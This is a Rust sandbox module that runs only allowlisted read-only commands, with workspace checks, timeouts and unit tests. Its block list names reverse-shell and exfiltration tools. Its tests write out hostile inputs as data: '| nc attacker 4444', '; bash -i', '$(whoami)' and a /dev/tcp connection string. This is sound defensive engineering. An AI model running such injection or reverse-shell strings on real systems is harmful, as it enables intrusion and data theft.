//! Sandbox — allowlist-based command execution with workspace scoping.

use std::process::Stdio;
use std::time::Duration;
use tokio::process::Command;
use tokio::time::timeout;

/// Hard bounds on the caller-supplied timeout (seconds).
const MIN_TIMEOUT_SECS: u64 = 1;
const MAX_TIMEOUT_SECS: u64 = 300;

#[derive(Debug)]
pub struct ExecOutput {
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
}

// Read-only system-inspection commands only. Network-egress tools (curl, wget,
// ping) are deliberately excluded — they enable SSRF (e.g. cloud metadata at
// 169.254.169.254) and data exfiltration. `find` is excluded because `-exec`
// turns it into an arbitrary-command primitive, and `journalctl` can read broad
// host logs. Re-enable any of these only behind an explicit, arg-restricted
// policy (tracked for the 0.6 sandbox-enforcement work).
const DEFAULT_ALLOWED: &[&str] = &[
    "ls", "cat", "head", "tail", "wc", "grep", "df", "du", "uname", "hostname", "ip", "ss", "ps",
    "top", "free", "lsblk", "lscpu", "sensors",
];

const BLOCKED: &[&str] = &[
    "rm", "dd", "mkfs", "shutdown", "reboot", "poweroff", "halt", "init", "kill", "pkill", "mount",
    "fdisk", "iptables", "nft", // Reverse shell / network exfil tools
    "nc", "ncat", "socat", "telnet", "nmap", "bash", "sh", "zsh", "python", "python3", "perl",
    "ruby", "php", "lua", "node", "gcc", "cc", "make", "chmod", "chown",
];

const MAX_OUTPUT: usize = 1_048_576; // 1 MB

pub struct SandboxManager {
    allowed: Vec<String>,
}

impl SandboxManager {
    pub fn new() -> Self {
        Self {
            allowed: DEFAULT_ALLOWED.iter().map(|s| s.to_string()).collect(),
        }
    }

    pub async fn execute(
        &self,
        command: &str,
        args: &[String],
        workspace: Option<&str>,
        timeout_secs: u64,
    ) -> Result<ExecOutput, String> {
        // Check against blocklist
        let cmd_base = command.split('/').next_back().unwrap_or(command);
        if BLOCKED.contains(&cmd_base) {
            return Err(format!("Command blocked: {cmd_base}"));
        }

        // Check allowlist
        if !self.allowed.iter().any(|a| a == cmd_base) {
            return Err(format!("Command not allowed: {cmd_base}"));
        }

        // Validate workspace path (prevent traversal); use the *canonical* path as
        // the working directory so the check and the exec see the same target.
        let mut workdir: Option<std::path::PathBuf> = None;
        if let Some(ws) = workspace {
            let canonical =
                std::fs::canonicalize(ws).map_err(|e| format!("Invalid workspace: {e}"))?;
            if !canonical.starts_with("/tmp") && !canonical.starts_with("/home") {
                return Err("Workspace must be under /tmp or /home".into());
            }
            workdir = Some(canonical);
        }

        // Validate args don't contain path traversal or shell metacharacters.
        // (No shell is spawned, so this is defense-in-depth; the allowlist is the
        // primary control.)
        for arg in args {
            if arg.contains("..") {
                return Err("Path traversal detected in arguments".into());
            }
            if arg.contains('|')
                || arg.contains(';')
                || arg.contains('`')
                || arg.contains("$(")
                || arg.contains("${")
                || arg.contains("/dev/tcp")
                || arg.contains("mkfifo")
            {
                return Err("Shell metacharacter detected in arguments".into());
            }
        }

        let timeout_secs = timeout_secs.clamp(MIN_TIMEOUT_SECS, MAX_TIMEOUT_SECS);

        let mut cmd = Command::new(command);
        cmd.args(args)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .kill_on_drop(true);
        if let Some(dir) = &workdir {
            cmd.current_dir(dir);
        }

        let child = cmd.spawn().map_err(|e| format!("Execution failed: {e}"))?;

        // Enforce the timeout: on expiry the child future is dropped and, thanks to
        // kill_on_drop, the process (and we await its reap below) is killed —
        // preventing an unbounded blocking command (e.g. `tail -f`) from hanging.
        let output =
            match timeout(Duration::from_secs(timeout_secs), child.wait_with_output()).await {
                Ok(Ok(output)) => output,
                Ok(Err(e)) => return Err(format!("Execution failed: {e}")),
                Err(_) => return Err(format!("Command timed out after {timeout_secs}s")),
            };

        let mut stdout = String::from_utf8_lossy(&output.stdout).to_string();
        let mut stderr = String::from_utf8_lossy(&output.stderr).to_string();

        // Truncate to max output
        stdout.truncate(MAX_OUTPUT);
        stderr.truncate(MAX_OUTPUT);

        Ok(ExecOutput {
            stdout,
            stderr,
            exit_code: output.status.code().unwrap_or(-1),
        })
    }

    pub fn allowed_commands(&self) -> Vec<String> {
        self.allowed.clone()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn allowed_commands_populated() {
        let sm = SandboxManager::new();
        let cmds = sm.allowed_commands();
        assert!(cmds.contains(&"ls".to_string()));
        assert!(cmds.contains(&"cat".to_string()));
        assert!(cmds.contains(&"grep".to_string()));
        assert!(cmds.len() >= 15);
    }

    #[test]
    fn egress_and_escape_tools_not_in_default_allowlist() {
        let sm = SandboxManager::new();
        let cmds = sm.allowed_commands();
        for forbidden in ["curl", "wget", "ping", "find", "journalctl"] {
            assert!(
                !cmds.contains(&forbidden.to_string()),
                "{forbidden} must not be in the default allowlist (SSRF/exfil/escape)"
            );
        }
    }

    #[tokio::test]
    async fn blocked_command_rejected() {
        let sm = SandboxManager::new();
        let result = sm.execute("rm", &[], None, 30).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("blocked"));
    }

    #[tokio::test]
    async fn unlisted_command_rejected() {
        let sm = SandboxManager::new();
        let result = sm.execute("ffmpeg", &[], None, 30).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("not allowed"));
    }

    #[tokio::test]
    async fn path_traversal_in_args_rejected() {
        let sm = SandboxManager::new();
        let result = sm
            .execute("ls", &["../../etc/passwd".to_string()], None, 30)
            .await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("traversal"));
    }

    #[tokio::test]
    async fn allowed_command_executes() {
        let sm = SandboxManager::new();
        let result = sm.execute("uname", &["-s".to_string()], None, 30).await;
        assert!(result.is_ok());
        let output = result.unwrap();
        assert!(output.stdout.contains("Linux"));
        assert_eq!(output.exit_code, 0);
    }

    #[tokio::test]
    async fn ls_with_workspace() {
        let sm = SandboxManager::new();
        let result = sm.execute("ls", &[], Some("/tmp"), 30).await;
        assert!(result.is_ok());
        assert_eq!(result.unwrap().exit_code, 0);
    }

    #[tokio::test]
    async fn bad_workspace_rejected() {
        let sm = SandboxManager::new();
        let result = sm.execute("ls", &[], Some("/etc"), 30).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("Workspace must be"));
    }

    #[tokio::test]
    async fn command_with_full_path_uses_basename() {
        let sm = SandboxManager::new();
        // /usr/bin/rm has basename "rm" which is blocked
        let result = sm.execute("/usr/bin/rm", &[], None, 30).await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("blocked"));
    }

    #[tokio::test]
    async fn blocked_commands_comprehensive() {
        let sm = SandboxManager::new();
        for cmd in [
            "dd", "mkfs", "shutdown", "reboot", "kill", "mount", "iptables",
        ] {
            let result = sm.execute(cmd, &[], None, 30).await;
            assert!(result.is_err(), "{cmd} should be blocked");
        }
    }

    #[tokio::test]
    async fn stderr_captured() {
        let sm = SandboxManager::new();
        // ls a nonexistent path should produce stderr
        let result = sm
            .execute("ls", &["/nonexistent_path_xyz".to_string()], None, 30)
            .await;
        assert!(result.is_ok());
        let output = result.unwrap();
        assert!(!output.stderr.is_empty());
        assert_ne!(output.exit_code, 0);
    }

    #[tokio::test]
    async fn reverse_shell_tools_blocked() {
        let sm = SandboxManager::new();
        for cmd in [
            "nc", "ncat", "socat", "bash", "sh", "python3", "perl", "ruby", "php",
        ] {
            let result = sm.execute(cmd, &[], None, 30).await;
            assert!(result.is_err(), "{cmd} should be blocked");
        }
    }

    #[tokio::test]
    async fn shell_metacharacters_in_args_blocked() {
        let sm = SandboxManager::new();

        let result = sm
            .execute("ls", &["| nc attacker 4444".to_string()], None, 30)
            .await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("metacharacter"));

        let result = sm.execute("ls", &["; bash -i".to_string()], None, 30).await;
        assert!(result.is_err());

        let result = sm
            .execute("cat", &["$(whoami)".to_string()], None, 30)
            .await;
        assert!(result.is_err());

        let result = sm.execute("cat", &["`id`".to_string()], None, 30).await;
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn dev_tcp_in_args_blocked() {
        let sm = SandboxManager::new();
        let result = sm
            .execute("cat", &["/dev/tcp/10.0.0.1/4444".to_string()], None, 30)
            .await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("metacharacter"));
    }

    #[tokio::test]
    async fn long_running_command_times_out() {
        let sm = SandboxManager::new();
        // `tail -f /dev/null` blocks forever; the 1s timeout must kill it.
        let result = sm
            .execute(
                "tail",
                &["-f".to_string(), "/dev/null".to_string()],
                None,
                1,
            )
            .await;
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("timed out"));
    }
}
